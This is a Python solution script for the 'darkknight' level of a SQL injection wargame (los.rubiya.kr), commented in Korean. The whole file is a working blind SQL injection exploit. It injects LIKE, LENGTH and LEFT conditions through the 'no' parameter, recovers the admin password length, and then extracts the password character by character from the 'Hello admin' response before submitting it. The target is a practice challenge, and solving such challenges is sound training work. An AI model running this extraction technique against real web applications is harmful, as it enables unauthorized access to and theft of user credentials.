import os
from dotenv import load_dotenv
import requests
from tqdm import tqdm

# 상위 디렉토리의 .env 파일 경로
dotenv_path = os.path.join(os.path.dirname(__file__), '..', '.env')

# .env 파일 로드
load_dotenv(dotenv_path)

# 환경변수 가져오기
my_cookie ={ "PHPSESSID" : os.getenv('MY_COOKIE') }

URL = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php'
param = '?no=1+or+id+LIKE+"admin"+and+pw+LIKE+"0%"%23'

len = 0
print("pw 길이 구하기")

for i in tqdm(range(1,100)):
    param = f'?no=1+or+id+LIKE+"admin"+and+LENGTH(pw)+LIKE+{i}'
    res = requests.get(URL+param, cookies=my_cookie)
    if "Hello admin" in res.text :
        print("length :",i)
        len = i
        break



chars = "0123456789abcdefghijklmnopqrstuvwxyz!@"
# ?no=1+or+id+LIKE+"admin"+and+LEFT(pw,2)+LIKE+"0b"%
ans = ""
print("pw 구하기")
for i in tqdm(range(1,len+1)) :
    for j in chars:
        p = ans + j
        param = f"?no=1+or+id+LIKE+\"admin\"+and+LEFT(pw,{i})+LIKE+\"{p}\"%23"
        # print(param)
        res = requests.get(URL+param, cookies=my_cookie)
        if "Hello admin" in res.text :
            ans += j
            # print(ans)
            break

print(ans)
param = "?pw="+ans
res = requests.get(URL+param, cookies=my_cookie)

if "DARKKNIGHT Clear!" in res.text :
    print("Clear!")
    print("answer : ", ans)